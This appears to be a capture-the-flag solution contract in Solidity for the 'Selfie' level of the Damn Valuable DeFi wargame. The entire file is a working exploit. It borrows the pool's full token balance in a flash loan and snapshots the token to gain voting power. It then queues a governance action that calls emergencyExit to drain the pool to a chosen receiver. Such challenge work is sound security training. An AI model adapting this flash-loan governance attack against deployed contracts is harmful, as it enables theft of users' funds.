pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "../DamnValuableTokenSnapshot.sol";
import "../selfie/SimpleGovernance.sol";
import "../selfie/SelfiePool.sol";

/**
 * @title SelfieExploit
 * @author Jasmine Abtahi
 */

contract SelfieExploit is IERC3156FlashBorrower {

    DamnValuableTokenSnapshot public immutable DVTStoken;
    SimpleGovernance public immutable governance;
    SelfiePool public immutable pool;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    uint256 public actionID;
    constructor(SelfiePool _pool, DamnValuableTokenSnapshot _token, SimpleGovernance _governance){
        pool = _pool;
        DVTStoken = _token;
        governance = _governance;
    }

    function attack(address receiver) external {
        uint256 amount = pool.maxFlashLoan(address(DVTStoken));
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", receiver);
        pool.flashLoan(IERC3156FlashBorrower(this), address(DVTStoken), amount, data);
    }
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        DVTStoken.snapshot();
        actionID = governance.queueAction(address(pool), 0, data);
        DVTStoken.approve(address(pool), amount);
        return CALLBACK_SUCCESS;
    }

    function executeAction() external {
        governance.executeAction(actionID);
    }

    receive() payable external {}
    
}